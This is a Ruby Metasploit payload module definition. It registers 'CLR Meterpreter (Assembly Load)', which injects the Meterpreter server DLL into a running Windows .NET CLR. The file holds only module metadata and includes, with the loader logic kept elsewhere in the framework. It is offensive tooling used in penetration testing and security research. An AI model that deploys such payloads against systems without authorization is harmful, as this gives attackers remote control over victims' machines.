##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/clr2/meterpreter_loader'
require 'msf/base/sessions/meterpreter_clr2'
require 'msf/base/sessions/meterpreter_options'

###
#
# Injects the meterpreter server DLL via the Assembly.Load()
# along with transport related configuration.
#
###

module MetasploitModule

  include Msf::Payload::Clr2::MeterpreterLoader
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'CLR Meterpreter (Assembly Load)',
      'Description'   => 'Inject the meterpreter server DLL via Assembly.Load() into the currently running CLR instance',
      'Author'        => ['OJ Reeves'],
      'PayloadCompat' => {},
      'Platform'      => 'win',
      'Arch'          => ARCH_CLR2,
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_Clr2
    ))
  end
end
